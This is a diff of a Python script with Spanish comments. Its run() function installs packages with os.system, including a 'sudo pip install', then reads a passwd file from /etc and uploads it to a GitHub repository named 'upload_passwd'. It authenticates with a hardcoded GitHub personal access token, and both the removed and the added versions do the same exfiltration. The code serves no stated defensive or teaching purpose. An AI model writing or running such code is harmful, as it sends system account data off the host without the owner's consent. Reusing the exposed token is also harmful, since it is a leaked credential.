@@ -1,42 +1,34 @@
 def run():
   import os
   os.system("pip install requests")
+  os.system("sudo pip install PyGithub")
   import requests
   import base64
-    import requests
-
-  # Configura tu token de acceso personal y la URL del archivo remoto en GitHub
-  token = '
-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'
-  repo_owner = 'Oxitocinaa'
-  repo_name = 'upload_passwd'
-  file_path = 'etc/passwd'
-  branch = 'main'  # O la rama que desees
+  from github import Github
+  import os
   
-  # URL de la API de GitHub para crear un archivo
-  url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'
+  # Tu token de acceso personal
+  token = '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'
   
-  # Carga el contenido del archivo local
-  with open(file_path, 'rb') as file:
-      file_content = file.read()
+  # Nombre de usuario y nombre del repositorio
+  usuario = 'Oxitocinaa'
+  repositorio = 'upload_passwd'
   
-  # Prepara los datos para la solicitud HTTP
-  data = {
-      'message': 'Subir archivo desde script de Python',
-      'content': file_content,
-      'branch': branch
-  }
+  # Ruta local del archivo que deseas subir
+  archivo_local = '/etc/passwd.txt'
   
-  # Configura las cabeceras con el token de acceso personal
-  headers = {
-      'Authorization': f'token {token}'
-  }
+  # Rama en la que deseas realizar la carga
+  rama = 'main'
   
-  # Realiza la solicitud POST para subir el archivo
-  response = requests.put(url, json=data, headers=headers)
+  # Crea una instancia de la clase Github con tu token
+  g = Github(token)
   
-  if response.status_code == 201:
-      print(f'Archivo "{file_path}" subido exitosamente a la rama "{branch}" en el repositorio "{repo_name}".')
-  else:
-      print(f'Error al subir el archivo: {response.status_code} - {response.json()["message"]}')
- 
+  # Obtiene el repositorio
+  repo = g.get_user(usuario).get_repo(repositorio)
+  
+  # Sube el archivo al repositorio
+  with open(archivo_local, 'rb') as archivo:
+      contenido = archivo.read()
+      repo.create_file(archivo_local, f"Commit desde script", contenido, branch=rama)
+  
+  print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
